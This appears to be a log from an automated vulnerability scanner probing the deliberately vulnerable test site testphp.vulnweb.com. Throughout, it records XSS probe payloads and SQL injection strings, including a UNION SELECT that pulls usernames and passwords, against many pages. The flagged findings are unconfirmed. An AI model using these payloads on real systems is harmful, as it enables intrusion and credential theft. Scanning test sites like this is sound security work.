2025-03-05 01:29:51,980 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:29:51.980621', 'url': 'http://testphp.vulnweb.com/admin/', 'vulnerability': 'sensitive', 'payload': 'Sensitive File Found'}
2025-03-05 01:31:45,948 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:45.947748', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:46,254 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:46.254474', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:46,561 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:46.561956', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:46,869 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:46.869272', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:47,177 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:47.177028', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:47,483 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:47.483188', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:47,785 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:47.785296', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:47,996 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:47.996163', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:49,359 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:49.359294', 'url': 'http://testphp.vulnweb.com/product.php?pic=1', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:49,568 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:49.568289', 'url': 'http://testphp.vulnweb.com/product.php?pic=1', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:49,839 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:49.839139', 'url': 'http://testphp.vulnweb.com/product.php?pic=1', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:50,146 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:50.146233', 'url': 'http://testphp.vulnweb.com/product.php?pic=1', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:50,760 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:50.760354', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:51,066 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:51.066983', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:51,375 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:51.375107', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:51,681 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:51.681659', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:51,988 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:51.988999', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:52,296 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:52.296231', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:52,603 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:52.603573', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:52,910 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:52.910967', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:53,219 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:53.219519', 'url': 'http://testphp.vulnweb.com/product.php?pic=6', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:53,524 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:53.524788', 'url': 'http://testphp.vulnweb.com/product.php?pic=6', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:53,833 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:53.833106', 'url': 'http://testphp.vulnweb.com/product.php?pic=6', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:54,144 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:54.144068', 'url': 'http://testphp.vulnweb.com/product.php?pic=6', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:54,754 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:54.754273', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:55,080 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:55.080146', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:55,368 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:55.368672', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:55,679 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:55.679884', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:55,982 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:55.982307', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:56,289 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:56.289748', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:56,498 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:56.498044', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:56,706 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:56.706869', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:56,914 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:56.914705', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=2', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:57,123 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:57.122536', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=2', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:57,450 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:57.450597', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=2', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:57,866 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:57.865457', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=2', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:31:59,007 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:59.007684', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:31:59,259 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:59.259573', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:31:59,567 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:59.567452', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:31:59,874 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:31:59.874503', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:32:06,005 - ERROR - Failed to scan http://testphp.vulnweb.com/hpp/?pp=12 - ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))
2025-03-05 01:32:09,500 - ERROR - Failed to scan http://testphp.vulnweb.com/hpp/?pp=12 - HTTPConnectionPool(host='testphp.vulnweb.com', port=80): Max retries exceeded with url: /hpp/?pp=12&q=%3Csvg%2Fonload%3Dalert%28%27XSS%27%29%3E (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x00000228DAAA4D90>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-03-05 01:32:14,929 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:14.928870', 'url': 'http://testphp.vulnweb.com/index.php', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:32:15,194 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:15.194364', 'url': 'http://testphp.vulnweb.com/index.php', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:32:15,401 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:15.401349', 'url': 'http://testphp.vulnweb.com/index.php', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:32:15,608 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:15.608881', 'url': 'http://testphp.vulnweb.com/index.php', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:32:16,258 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:16.258680', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:32:16,565 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:16.565527', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:32:16,801 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:16.801615', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:32:17,011 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:17.011738', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:32:17,282 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:17.282382', 'url': 'http://testphp.vulnweb.com/product.php?pic=4', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:32:17,589 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:17.589537', 'url': 'http://testphp.vulnweb.com/product.php?pic=4', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:32:17,897 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:17.897243', 'url': 'http://testphp.vulnweb.com/product.php?pic=4', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:32:18,204 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:18.204316', 'url': 'http://testphp.vulnweb.com/product.php?pic=4', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:32:18,818 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:18.818123', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:32:19,125 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:19.125372', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:32:19,432 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:19.432300', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:32:19,739 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:19.739711', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:32:20,789 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:20.789428', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:32:21,071 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:21.071376', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:32:21,378 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:21.378553', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:32:21,686 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:21.685072', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:32:21,992 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:21.992209', 'url': 'http://testphp.vulnweb.com/product.php?pic=3', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:32:22,299 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:22.299595', 'url': 'http://testphp.vulnweb.com/product.php?pic=3', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:32:22,607 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:22.607762', 'url': 'http://testphp.vulnweb.com/product.php?pic=3', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:32:22,913 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:22.913948', 'url': 'http://testphp.vulnweb.com/product.php?pic=3', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:32:23,529 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:23.529462', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:32:24,226 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:24.226224', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:32:24,450 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:24.450807', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:32:24,758 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:24.757758', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:32:25,068 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:25.068381', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:32:25,373 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:25.373133', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:32:25,689 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:25.689431', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:32:25,986 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:25.986687', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:32:29,267 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:29.266967', 'url': 'http://testphp.vulnweb.com/listproducts.php?cat=4', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:32:29,579 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:29.579280', 'url': 'http://testphp.vulnweb.com/listproducts.php?cat=4', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:32:29,788 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:29.788194', 'url': 'http://testphp.vulnweb.com/listproducts.php?cat=4', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:32:29,996 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:29.996607', 'url': 'http://testphp.vulnweb.com/listproducts.php?cat=4', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:32:30,594 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:30.594013', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:32:30,906 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:30.906211', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:32:31,214 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:31.214155', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:32:31,515 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:31.515114', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:32:31,822 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:31.822716', 'url': 'http://testphp.vulnweb.com/artists.php', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:32:32,132 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:32.132232', 'url': 'http://testphp.vulnweb.com/artists.php', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:32:32,438 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:32.437149', 'url': 'http://testphp.vulnweb.com/artists.php', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:32:32,750 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:32.750501', 'url': 'http://testphp.vulnweb.com/artists.php', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:32:33,359 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:33.358392', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:32:33,669 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:33.669770', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:32:33,973 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:33.973242', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:32:34,283 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:34.283877', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:32:36,124 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:36.124983', 'url': 'http://testphp.vulnweb.com/listproducts.php?cat=2', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:32:36,430 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:36.430021', 'url': 'http://testphp.vulnweb.com/listproducts.php?cat=2', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:32:36,944 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:36.944696', 'url': 'http://testphp.vulnweb.com/listproducts.php?cat=2', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:32:37,447 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:37.447714', 'url': 'http://testphp.vulnweb.com/listproducts.php?cat=2', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:32:37,968 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:37.968729', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<script>alert('XSS')</script>"}
2025-03-05 01:32:38,275 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:38.275458', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<img src='x' onerror='alert(1)'>"}
2025-03-05 01:32:38,586 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:38.586417', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': "<svg/onload=alert('XSS')>"}
2025-03-05 01:32:38,888 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:32:38.888871', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'xss', 'payload': '<body onload=alert(1)>'}
2025-03-05 01:33:38,997 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:38.997798', 'url': 'http://testphp.vulnweb.com/disclaimer.php', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:33:39,304 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:39.304719', 'url': 'http://testphp.vulnweb.com/disclaimer.php', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:33:39,611 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:39.611483', 'url': 'http://testphp.vulnweb.com/disclaimer.php', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:33:39,924 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:39.924468', 'url': 'http://testphp.vulnweb.com/disclaimer.php', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:33:40,908 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:40.907171', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:33:41,147 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:41.147945', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:33:41,456 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:41.456055', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:33:41,761 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:41.761598', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:33:43,813 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:43.813442', 'url': 'http://testphp.vulnweb.com/login.php', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:33:44,047 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:44.047767', 'url': 'http://testphp.vulnweb.com/login.php', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:33:44,328 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:44.327548', 'url': 'http://testphp.vulnweb.com/login.php', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:33:44,629 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:44.629781', 'url': 'http://testphp.vulnweb.com/login.php', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:33:45,250 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:45.250272', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:33:45,549 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:45.549973', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:33:45,862 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:45.862570', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:33:46,165 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:46.165556', 'url': 'http://testphp.vulnweb.com/userinfo.php', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:33:46,472 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:46.472436', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:33:46,780 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:33:46.780108', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
